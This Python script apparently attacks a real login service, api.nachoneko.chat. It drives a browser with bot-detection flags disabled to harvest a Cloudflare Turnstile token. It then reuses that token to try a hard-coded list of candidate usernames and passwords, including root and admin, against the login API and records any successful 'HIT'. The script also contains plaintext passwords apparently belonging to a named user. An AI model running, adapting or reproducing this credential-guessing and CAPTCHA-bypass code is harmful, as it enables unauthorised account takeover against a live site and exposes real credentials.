import json, os, sys, time, urllib.request, urllib.error, ssl, socket
OUT=[]
def log(s):
    print(s, flush=True); OUT.append(str(s))

def post_json(url, obj, timeout=25, headers=None):
    data=json.dumps(obj).encode()
    h={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","Accept":"application/json"}
    if headers: h.update(headers)
    req=urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        r=urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return r.status, r.read().decode('utf-8','replace')[:1500], dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')[:1500], dict(e.headers)
    except Exception as e:
        return -1, "ERR %s %s"%(type(e).__name__,str(e)[:200]), {}

def get(url, timeout=20):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"}),timeout=timeout,context=ssl._create_unverified_context())
        return r.status, r.read().decode('utf-8','replace')[:800]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')[:800]
    except Exception as e:
        return -1, "ERR %s"%e

def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://ipinfo.io/ip"):
        s,b=get(u)
        if s==200 and b.strip(): return b.strip()
    return "?"

def try_login(tok, user, pw, tag):
    url="https://api.nachoneko.chat/api/user/login"
    if tok: url += "?turnstile="+urllib.parse.quote(tok)
    st, body, hdrs = post_json(url, {"username":user,"password":pw})
    log("LOGIN[%s] u=%s st=%s body=%s" % (tag, user, st, body.replace("\n"," ")[:400]))
    return st, body, hdrs

def render():
    from playwright.sync_api import sync_playwright
    UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    res={"token":None,"diag":[]}
    with sync_playwright() as p:
        b=p.chromium.launch(headless=False, args=['--no-sandbox','--disable-blink-features=AutomationControlled','--disable-dev-shm-usage'])
        ctx=b.new_context(user_agent=UA, locale='zh-CN', viewport={'width':1366,'height':900})
        page=ctx.new_page()
        def onresp(r):
            u=r.url
            if '/cdn-cgi/challenge-platform' in u or 'challenges.cloudflare.com' in u:
                try: res["diag"].append("%s %s" % (r.status, u[:120]))
                except Exception: pass
        page.on('response', onresp)
        for url in ('https://api.nachoneko.chat/sign-in','https://api.nachoneko.chat/'):
            try:
                page.goto(url, wait_until='domcontentloaded', timeout=60000)
                log("GOTO %s body_len=%d title=%s" % (url, len(page.content()), page.title()))
            except Exception as e:
                log("GOTOERR %s %s" % (url, str(e)[:150]))
                continue
            tok=None
            for i in range(20):
                page.wait_for_timeout(3000)
                try:
                    tok=page.evaluate("()=>{const el=document.querySelector('input[name=cf-turnstile-response]');return el?el.value:null}")
                except Exception as e:
                    tok=None
                try:
                    fl=[(f.url[:90], f.evaluate("()=>document.body?document.body.innerText.replace(/\\s+/g,' ').slice(0,150):''")) for f in page.frames if 'challenge' in f.url]
                except Exception:
                    fl=[]
                log("t%d tok=%r frames=%r" % (i*3, (tok[:20] if tok else tok), fl[:3]))
                if tok: break
                try:
                    w=page.query_selector('.cf-turnstile, #cf-turnstile, [data-turnstile]')
                    if w: w.click(timeout=800, force=True)
                except Exception: pass
            if tok:
                res["token"]=tok
                break
        try: b.close()
        except Exception: pass
    return res

def main():
    log("== RUNNER %s ==" % socket.gethostname())
    log("EGRESS %s" % egress())
    st,b=get("https://api.nachoneko.chat/api/status")
    log("TARGET status %s len=%d head=%s" % (st, len(b), b[:120]))
    # baseline: no token
    try_login(None, "muhan", "Liu310013.", "notoken-baseline")
    try_login("XXX.DUMMY.TOKEN.XXX", "muhan", "Liu310013.", "dummy")
    r=render()
    tok=r["token"]
    log("TOKEN=%r" % (tok[:60] if tok else None))
    log("DIAG=%r" % (r["diag"][:15],))
    if tok:
        # reuse test: same token twice
        try_login(tok, "muhan", "__wrongprobe__x", "reuse1")
        try_login(tok, "muhan", "__wrongprobe__x", "reuse2")
        cands=[("muhan","Liu310013."),("root","Liu310013."),("admin","Liu310013."),("OpenApi","Liu310013."),
               ("muhan","OpenRealmAdmin.."),("root","Neko@Pwn2026!"),("muhan","7sBnoENQzHR1EzLHL3so"),
               ("root","pR6kHZChMC9xpoxGYRrP"),("muhan","258025")]
        for u,pw in cands:
            st,body,hdrs=try_login(tok,u,pw,"cand")
            try:
                j=json.loads(body)
            except Exception:
                j={}
            if j.get("success") or ("token" in str(j).lower() and "incorrect" not in body):
                log("HIT %s %s -> %s" % (u,pw,body[:300]))
        log("DONE_CANDS")
    text="\n".join(OUT)
    open("out10.txt","w").write(text)
    for i in range(0,len(text),25000):
        open("zz-part10-%d.txt"%(i//25000),"w").write(text[i:i+25000])
    log("PARTS %d" % (len(text)//25000+1))

main()
